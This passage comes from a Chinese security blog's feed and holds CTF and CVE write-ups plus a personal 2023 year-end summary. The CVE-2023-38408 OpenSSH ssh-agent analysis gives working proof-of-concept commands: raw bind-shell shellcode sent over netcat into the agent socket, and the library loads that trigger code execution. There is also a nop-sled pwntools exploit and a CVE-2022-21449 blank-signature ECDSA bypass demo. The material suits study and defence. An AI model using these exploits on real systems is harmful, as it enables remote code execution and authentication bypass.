class="number">117859946800380767356190121030392492081340616512</span>, <span class="number">26966646740134065096660259687229179143947213779</span></span><br><span class="line">(h2, r2, s2) = <span class="number">236574518096866758760287021848258048065293279716</span>, <span class="number">863199000523521111517835459866422731857447792677</span>, <span class="number">517924607931342012033031470185302567344725962419</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">17474742587088593627</span></span><br><span class="line"></span><br><span class="line">k = (h1*r2-h2*r1 + b*s2*r1)*inverse(s1*r2-a*s2*r1,q) % q</span><br><span class="line">x = (k*s1 - h1)*inverse(r1,q) % q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(x))</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h1 id=&quot;0x01-Not-Wiener&quot;&gt;&lt;a href=&quot;#0x01-Not-Wiener&quot; class=&quot;headerlink&quot; title=&quot;0x01 Not Wiener</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2023-Summary</title>
    <link href="http://example.com/2023/12/31/2023-Summary/"/>
    <id>http://example.com/2023/12/31/2023-Summary/</id>
    <published>2023-12-31T15:53:25.000Z</published>
    <updated>2023-12-31T17:31:48.711Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>大二下一堆课，学的是依托💩。大三上爽，课少，有更多时间摸鱼。</p><p>送别大四两位毕业的学长师傅。</p><blockquote><p>长亭外，古道边，芳草碧连天<br>晚风拂柳笛声残，夕阳山外山</p><p>天之涯，地之角，知交半零落<br>一瓢浊酒尽余欢，今宵别梦寒</p></blockquote><p>看的书：</p><ul><li><p>《科幻世界》一本没落下，补完了。现在感觉国内中短篇科幻写的就是依托，就连《依尘》这种堆砌文藻、数学公式显得自己很牛逼的东西都端上来了。</p><blockquote><p>不过SFW科幻大会很过瘾，大刘很和蔼一老头，乐呵呵给我签名。</p><p>王诺诺好看捏（抬走） </p></blockquote></li><li><p>《战争与和平》：读到三四百页鸽了，过了一段时间从头读。我就喜欢这味！仿佛身临其境体会人物的喜怒哀乐，一言一行。字里行间更是金句频出。</p><blockquote><p>此生必去一趟俄罗斯，还愿。</p></blockquote></li><li><p>一些论文：就不一一贴了，有的看完有的鸽了，笔记也记的稀稀拉拉，太懒了。</p></li><li><p>技术方面：《Go 语言编程之旅：一起用 Go 做项目》非常好Go，让我的代码力提升。基于这本书和阿鲁师傅的提点，给我出题提供了灵感和技术支撑；《<em>Learn You a Haskell</em>》，用公式写程序，非常优雅上流。</p></li></ul><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">quicksort</span> :: (<span class="type">Ord</span> a) =&gt; [a] -&gt; [a]  </span><br><span class="line"><span class="title">quicksort</span> [] = []  </span><br><span class="line"><span class="title">quicksort</span> (x:xs) =   </span><br><span class="line">    <span class="keyword">let</span> smallerSorted = quicksort [a | a &lt;- xs, a &lt;= x]  </span><br><span class="line">        biggerSorted = quicksort [a | a &lt;- xs, a &gt; x]  </span><br><span class="line">    <span class="keyword">in</span>  smallerSorted ++ [x] ++ biggerSorted  </span><br></pre></td></tr></table></figure><p>走的地方：</p><ul><li>成都：大本营，基本就是学校（学校里寝室-教室-实验室三点一线），经常和群友到北街恰饭，开发了不少好地方。平安SRC讲座+晚宴，讲座都是二进制的东西，挖浏览器的洞太帅了（），其他看不懂（），晚宴丰盛捏。加了长亭的大佬v，问有无内推，答最近没hc。安全行业愁云惨淡。</li><li>北京：去耍的，逛航博。想把阿鲁约出来吃饭，犬安大哥不待见兄弟😭。路上误打误撞闯入奇安信老窝，正值护网阶段，门口四个佬聊技术，给🐭🐭听的一愣一愣的。</li><li>深圳：补天白帽大会。讲座请了y4讲字节码，另外还有山大女博士讲安卓提权，忘了谁讲的开发交互式的二进制漏洞挖掘工具。我带着迷茫去深圳，带着思考、收获、信心回来。</li><li>哈尔滨：哈工大真大，计算机学院有独立的楼，把🐭🐭震惊到了。市区俄味很浓。</li><li>沈阳：到沈阳大街，做大保健。</li><li>丹东：隔着鸭绿江，眺望光之国。</li><li>重庆：父母游母校拉上🐭🐭的。</li></ul><p>我时常回忆起22年打鹏程杯的那个夏天，那时我们打车去赛场，阳光正好，我们满怀对未来的憧憬。如今人走人留，有失有得，让我每每回想无语凝噎。而<strong>2023年</strong>，就像一个长长的假期，上半年紧张的放假，下半年悠闲的放假。我走了很多地方，但真正留在我心底的美景就那么几个；认识了很多人，也因为自身或外部原因与他们断了联系；参与了很多事情，有些搞的好，不过好多还是没搞好。在迷茫中挣扎求变，上下求索就是我2023的最好画像。</p><p>就这样吧，希望<strong>2024</strong>变得更好。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401010131505.png" alt="image-20240101013133418"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;大二下一堆课，学的是依托💩。大三上爽，课少，有更多时间摸鱼。&lt;/p&gt;
&lt;p&gt;送别大四两位毕业的学长师傅。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;长亭外，古道边，芳草碧连天&lt;br</summary>
      
    
    
    
    
    <category term="other" scheme="http://example.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-38408-Brief-analysis</title>
    <link href="http://example.com/2023/12/27/CVE-2023-38408-Brief-analysis/"/>
    <id>http://example.com/2023/12/27/CVE-2023-38408-Brief-analysis/</id>
    <published>2023-12-27T15:56:20.000Z</published>
    <updated>2024-01-27T01:27:57.410Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p><img src="https://iototsecnews.files.wordpress.com/2023/07/openssh.png?w=1008" alt="img"></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>SSH（Secure Shell）是一种加密的网络传输协议。主要用来在客户端和服务器之间建立安全通信隧道。使用SSH进行远程登录，信息传输是加密的，即使信息被中途截获也不会泄露。OpenSSH软件套件负责SSH协议的实现。</p><p>23年七月爆出来OpenSSH(9.3p2版本以前)的一个CVE，用户使用 SSH-Agent 代理转发功能连接攻击者恶意服务器时，由于 SSH-Agent 未对加载的共享库进行限制，攻击者可通过将恶意共享库作为参数传递给 SSH-Agent 并通过其调用 dlopen&#x2F;dlclose 函数加载 &#x2F; 卸载位于用户客户端主机的共享库，实现远程代码执行。</p><p>攻击流程如图：</p><p><img src="https://github.com/LucasPDiniz/CVE-2023-38408/raw/main/img/poc.JPG" alt="img"></p><ul><li>攻击者通过SSH连接到服务器</li><li>Alice也通过SSH连接到服务器，此时Alice使用SSH转发代理连接到攻击者。</li><li>攻击者创建shellcode, 通过ssh进程发送给目标服务器</li><li>shellcode利用ssh-agent的PKCS#11漏洞创建一个新进程，劫持Alice的ssh访问权限</li><li>成功执行该攻击后，攻击者可能会访问绑定shell（shell代码），该shell可以使用netcat进行访问。</li></ul><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>目标：提升redqueenrebel权限，损害alice账户</p><p>机器：</p><ul><li>workstation: 受害者机器</li><li>kali 攻击者机器</li></ul><p>用户：</p><ul><li>redqueenrebel: 非特权用户</li><li>alice: workstation的root用户</li><li>root: hacker</li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>首先我们已经完成攻击的第一、二步，也即两个用户已经有权通过SSH访问服务器。</p><ol><li><p>获取在远程攻击者计算机上运行的 SSH 代理的 PID ，并导出到环境变量。我们还通过 ssh-add 添加了文件 linuxx64.elf.stub（UEFI 引导存根）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> /tmp/ssh-*/agent.*</span><br><span class="line"><span class="built_in">export</span> SSH_AUTH_SOCK=/tmp/ssh-NqLP6il36s/agent.3452</span><br><span class="line">ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401042335331.png" alt="image-20240104233548210"></p><ol start="2"><li><p>通过SSH把 shellcode复制到进程中</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHELLCODE=$<span class="string">&#x27;\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05&#x27;</span></span><br><span class="line">(perl -e <span class="string">&#x27;print &quot;\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6&quot; . &quot;\x90&quot; x 10000&#x27;</span>; <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$SHELLCODE</span>&quot;</span>) | nc -U <span class="string">&quot;<span class="variable">$SSH_AUTH_SOCK</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>一旦 shellcode 成功放入代理内存中，直接按CtrlC，停止 netcat 传输。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401042337741.png" alt="image-20240104233746664"></p><ol start="3"><li><p>通过ssh-add上传：ibttcn3-rt2-dynamic.so、libKF5SonnetUi.so.5.92.0 和 libns3.35-wave.so.0.0.0，触发<strong>SIGSEGV</strong>漏洞。</p><blockquote><p><code>SIGSEGV</code> 是Linux和类Unix系统中的一个信号，它表示”Segmentation Fault”（分段错误）。当一个程序尝试访问未分配给它的内存区域，或者访问已经被释放的内存区域，就会触发 <code>SIGSEGV</code> 信号。收到 SIGSEGV 信号后，内核会识别出发生了无效内存访问，并继续调用自定义信号处理程序，而不是突然终止程序。此时攻击者会操纵程序的执行，并将其引导至位于 NOP 雪橇内的注入恶意代码。</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so</span><br><span class="line">[Enter <span class="keyword">for</span> passphrase]</span><br><span class="line">ssh-add -s /usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0</span><br><span class="line">[Enter <span class="keyword">for</span> passphrase]</span><br><span class="line">ssh-add -s /usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0</span><br><span class="line">[Enter <span class="keyword">for</span> passphrase]</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>成功提Alice的权，映射到端口31337上。</p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401042352811.png" alt="image-20240104235222726" style="zoom: 50%;" /></li></ol><h2 id="PS1-nop-sled"><a href="#PS1-nop-sled" class="headerlink" title="PS1 nop-sled"></a>PS1 nop-sled</h2><p>nop是一条不做任何操作的单指令，对应的十六进制编码为0x90。这里nop将被用作欺骗因子。通过创建一个大的NOP指令数组并将其放在shellcode之前，如果EIP返回到存储nop sled的任意地址，那么在达到shellcode之前，每执行一条nop指令，EIP都会递增。这就是说只要返回地址被nop sled中的某一地址所重写，EIP就会将sled滑向将正常执行的shellcode。<br>以一个简单程序的pwn解释：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401052031291.png" alt="image-20240105203131190"></p><p>32位，canary保护开了，但没开NX和PIE，所以还是可以把shellcode写到栈上执行的。</p><p>反汇编main函数时报错：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401052122346.png" alt="image-20240105212226312"></p><p>由于F5在分析调用时，未能成功解析参数位置&#x2F;参数个数，<br>解决方法：就是先undefine掉函数，在右键现在code,之后Creat function 就可以正常反编译了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> (*v5)(<span class="type">void</span>); <span class="comment">// [esp+0h] [ebp-1010h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [esp+4h] [ebp-100Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [esp+1004h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v8; <span class="comment">// [esp+1008h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> savedregs; <span class="comment">// [esp+1010h] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  v8 = &amp;argc;</span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  logo();</span><br><span class="line">  srand((<span class="type">unsigned</span> <span class="type">int</span>)&amp;seed);</span><br><span class="line">  Loading();</span><br><span class="line">  acquire_satellites();</span><br><span class="line">  v3 = query_position();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We need to load the ctfshow_flag.\nThe current location: %p\n&quot;</span>, v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What will you do?\n&gt; &quot;</span>);</span><br><span class="line">  fgets((<span class="type">char</span> *)&amp;seed, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Where do you start?\n&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%p&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">return</span> sub_8048A22(v5, (<span class="type">int</span>)&amp;savedregs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>query_position函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">query_position</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [esp+3h] [ebp-15h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &amp;v1 + rand() % <span class="number">1337</span> - <span class="number">668</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序执行逻辑是：</p><ul><li>输出栈中的地址</li><li>输入字符串赋给seed</li><li>输入地址赋给v5</li><li>使用v5()，从输入的地址，执行该地址的代码</li></ul><p>如果在栈中的某个位置填入大量nop指令再接上shellcode，随后控制程序的执行流从nop指令开始执行，则程序就会一直执行之前填入的nop，然后就是shellcode，从而成功pwn掉。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;xxxx&quot;</span>,<span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;current location: &quot;</span>)</span><br><span class="line"><span class="comment"># 接收position</span></span><br><span class="line">addr = <span class="built_in">eval</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line"><span class="comment"># \x90为nop指令</span></span><br><span class="line">payload = <span class="string">b&quot;\x90&quot;</span> * <span class="number">1336</span> + asm(shellcraft.sh())</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># 输进v5的地址</span></span><br><span class="line">shell_addr = addr + <span class="number">0x2d</span> + <span class="number">668</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">hex</span>(shell_addr))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401052351754.png" alt="image-20240105235100666"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;&lt;img src=&quot;https://iototsecnews.files.wordpress.com/2023/07/openssh.png?w=1008&quot; alt=&quot;img&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="vul" scheme="http://example.com/tags/vul/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-21449-Brief-analysis</title>
    <link href="http://example.com/2023/12/27/CVE-2022-21449-Brief-analysis/"/>
    <id>http://example.com/2023/12/27/CVE-2022-21449-Brief-analysis/</id>
    <published>2023-12-27T07:36:51.000Z</published>
    <updated>2023-12-27T07:39:44.514Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>ECDSA代表椭圆曲线数字签名算法，与旧的RSA签名相比，ECDSA签名长度更短，因此应用面较广，例如各种JWT场景。服务器使用java15~18版本的ECDSA，会受到攻击者绕过的影响。由于ECDSA未对提交的r和s值做仔细的检查，攻击者可通过将为0的r和s作为参数提交给服务器，实现绕过验签的过程。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>JShell – 版本 15.0.2</p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">jshell&gt; <span class="keyword">import</span> java.security.*</span><br><span class="line"></span><br><span class="line">jshell&gt; <span class="type">var</span> <span class="variable">keys</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;EC&quot;</span>).generateKeyPair()</span><br><span class="line">keys ==&gt; java.security.KeyPair@63e31ee</span><br><span class="line"></span><br><span class="line">jshell&gt; <span class="type">var</span> <span class="variable">blankSignature</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">64</span>]</span><br><span class="line">blankSignature ==&gt; <span class="type">byte</span>[<span class="number">64</span>] &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, ... , <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;</span><br><span class="line"></span><br><span class="line">jshell&gt; <span class="type">var</span> <span class="variable">sig</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA256WithECDSAInP1363Format&quot;</span>)</span><br><span class="line">sig ==&gt; Signature object: SHA256WithECDSAInP1363Format&lt;not initialized&gt;</span><br><span class="line"></span><br><span class="line">jshell&gt; sig.initVerify(keys.getPublic())</span><br><span class="line"></span><br><span class="line">jshell&gt; sig.update(<span class="string">&quot;Hello, World&quot;</span>.getBytes())</span><br><span class="line"></span><br><span class="line">jshell&gt; sig.verify(blankSignature)</span><br><span class="line">$<span class="number">7</span> ==&gt; <span class="literal">true</span></span><br><span class="line"><span class="comment">// 成功绕过验签</span></span><br></pre></td></tr></table></figure><h2 id="技术细节"><a href="#技术细节" class="headerlink" title="技术细节"></a>技术细节</h2><p>ECDSA签名由两个值组成，称为r和s。验签需要检查的含有r, s, 公钥和消息的摘要值的方程。方程一侧是r, 另一侧包含r和s。因此如果r和s均为0，则方程结果是$0&#x3D;0\times \alpha(something)$, 从而方程成立，验签通过。</p><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>jwt一般会对参数编码，故针对特定场景，需要构造不同的payload。</p><p>强网杯2022 <strong>myJWT</strong> :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.interfaces.ECPrivateKey;</span><br><span class="line"><span class="keyword">import</span> java.security.interfaces.ECPublicKey;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECDSA</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> KeyPair <span class="title function_">keyGen</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">keyPairGenerator</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;EC&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">384</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="keyword">return</span> keyPair;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] sign(<span class="type">byte</span>[] str, ECPrivateKey privateKey) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signature</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA384withECDSAinP1363Format&quot;</span>);</span><br><span class="line">        signature.initSign(privateKey);</span><br><span class="line">        signature.update(str);</span><br><span class="line">        <span class="type">byte</span>[] sig = signature.sign();</span><br><span class="line">        <span class="keyword">return</span> sig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(<span class="type">byte</span>[] sig, <span class="type">byte</span>[] str ,ECPublicKey publicKey)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signature</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA384withECDSAinP1363Format&quot;</span>);</span><br><span class="line">        signature.initVerify(publicKey);</span><br><span class="line">        signature.update(str);</span><br><span class="line">        <span class="keyword">return</span> signature.verify(sig);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jwt</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">EXPIRE</span> <span class="operator">=</span> <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">ECDSA</span> <span class="variable">ecdsa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ECDSA</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateToken</span><span class="params">(String user, ECPrivateKey ecPrivateKey)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">header</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        header.put(<span 